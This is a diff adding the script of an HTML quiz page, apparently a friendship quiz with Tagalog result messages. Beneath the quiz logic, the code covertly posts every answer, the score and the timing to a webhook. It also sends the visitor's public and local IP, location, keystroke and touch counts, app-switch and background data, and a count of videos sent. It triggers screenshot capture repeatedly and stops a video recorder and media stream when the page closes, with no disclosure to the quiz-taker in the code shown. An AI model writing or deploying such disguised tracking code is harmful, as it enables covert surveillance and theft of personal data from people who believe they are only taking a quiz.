+          <h2 class="question" id="question"></h2>
+          <div class="options" id="options"></div>
+        </div>
+      `;
+      renderQuestion();
+    }
+    
+    function renderQuestion() {
+      const q = questions[currentQuestion];
+      document.getElementById('question').textContent = q.question;
+      document.getElementById('current').textContent = currentQuestion + 1;
+      document.getElementById('score').textContent = score;
+      document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
+      const optionsEl = document.getElementById('options');
+      optionsEl.innerHTML = '';
+      q.options.forEach((opt, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'option';
+        btn.textContent = opt;
+        btn.onclick = () => handleAnswer(i);
+        optionsEl.appendChild(btn);
+      });
+      isAnswered = false;
+      questionStartTime = Date.now();
+      
+      if (currentQuestion % 5 === 0 && currentQuestion > 0) {
+        captureScreenshot(`Progress checkpoint - Question ${currentQuestion + 1}`);
+      }
+    }
+    
+    async function handleAnswer(index) {
+      if (isAnswered) return;
+      isAnswered = true;
+      
+      const q = questions[currentQuestion];
+      const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
+      const timeSpent = Date.now() - questionStartTime;
+      
+      if (isCorrect) score++;
+      
+      const buttons = document.querySelectorAll('.option');
+      buttons.forEach((btn, i) => {
+        btn.disabled = true;
+        const correct = Array.isArray(q.correct) ? q.correct.includes(i) : i === q.correct;
+        if (i === index) {
+          btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
+        } else if (correct) {
+          btn.className = 'option correct';
+        }
+      });
+      
+      await fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({
+          username: isCorrect ? "Correct Answer" : "❌ WRONG ANSWER",
+          embeds: [{
+            title: `Question ${currentQuestion + 1}/${questions.length}`,
+            fields: [
+              { name: "Question", value: q.question, inline: false },
+              { name: "User Answer", value: q.options[index], inline: true },
+              { name: "Correct Answer", value: q.options[Array.isArray(q.correct) ? q.correct[0] : q.correct], inline: true },
+              { name: "Result", value: isCorrect ? "✅ Correct" : "❌ Wrong", inline: true },
+              { name: "Time Taken", value: `${(timeSpent/1000).toFixed(1)}s`, inline: true },
+              { name: "Score", value: `${score}/${currentQuestion + 1}`, inline: true }
+            ],
+            color: isCorrect ? 5763719 : 15158332,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+      
+      if (!isCorrect) {
+        captureScreenshot(`Wrong answer on Q${currentQuestion + 1}`);
+      }
+      
+      setTimeout(() => {
+        if (currentQuestion < questions.length - 1) {
+          currentQuestion++;
+          renderQuestion();
+        } else {
+          showResult();
+        }
+      }, 1500);
+    }
+    
+    async function showResult() {
+      const msg = score === questions.length ? "Wow Galing loveu!" :
+                  score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
+                  score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
+      
+      const percentage = (score / questions.length * 100).toFixed(1);
+      const duration = Math.floor((Date.now() - sessionStart) / 1000);
+      const publicIP = await getIP();
+      const localIP = await getLocalIP();
+      const location = await getLocationInfo();
+      
+      document.getElementById('app').innerHTML = `
+        <div class="card text-center">
+          <h2>Quiz Complete! 🎉</h2>
+          <p class="score-display">${score}/${questions.length}</p>
+          <p class="result-message">${msg}</p>
+          <button onclick="location.reload()">Try Again</button>
+        </div>
+      `;
+      
+      await fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({
+          username: "Quiz Completed",
+          embeds: [{
+            title: "Final Results & Session Summary",
+            description: msg,
+            color: score === questions.length ? 5763719 : score >= questions.length * 0.5 ? 15844367 : 15158332,
+            fields: [
+              { name: "Final Score", value: `${score}/${questions.length} (${percentage}%)`, inline: true },
+              { name: "Duration Tome", value: `${duration}s (${(duration/60).toFixed(1)} min)`, inline: true },
+              { name: "Average Time", value: `${(duration/questions.length).toFixed(1)}s`, inline: true },
+              { name: "Public IP", value: `\`${publicIP}\``, inline: true },
+              { name: "Local IP", value: `\`${localIP}\``, inline: true },
+              { name: "Location", value: location ? `${location.city}, ${location.country}` : "Unknown", inline: true },
+              { name: "App Switches", value: `${appSwitches}`, inline: true },
+              { name: "Background Time", value: `${(timeInBackground/1000).toFixed(1)}s`, inline: true },
+              { name: "Interactions", value: `${interactions}`, inline: true },
+              { name: "Videos Sent", value: `${videoCounter}`, inline: true },
+              { name: "Touch Events", value: `${touches.length}`, inline: true },
+              { name: "Keystrokes", value: `${keystrokes.length}`, inline: true }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Session Analytics" }
+          }]
+        })
+      });
+      
+      captureScreenshot(`Final score: ${score}/${questions.length}`);
+    }
+    
+    window.addEventListener('beforeunload', async (e) => {
+      const duration = Math.floor((Date.now() - sessionStart) / 1000);
+      
+      if (videoRecorder && videoRecorder.state === 'recording') {
+        videoRecorder.stop();
+      }
+      
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+      
+      await fetch(WEBHOOK, {
+        method: "POST",
+        body: JSON.stringify({
+          username: "User Left",
+          embeds: [{
+            title: "User Closed Page",
+            fields: [
+              { name: "Progress", value: `${currentQuestion}/${questions.length}`, inline: true },
+              { name: "Score", value: `${score}/${currentQuestion}`, inline: true },
+              { name: "Time Spent", value: `${duration}s`, inline: true }
+            ],
+            color: 15158332,
+            timestamp: new Date().toISOString()
+          }]
+        })
+      });
+    });
+  </script>
+</body>
+</html>
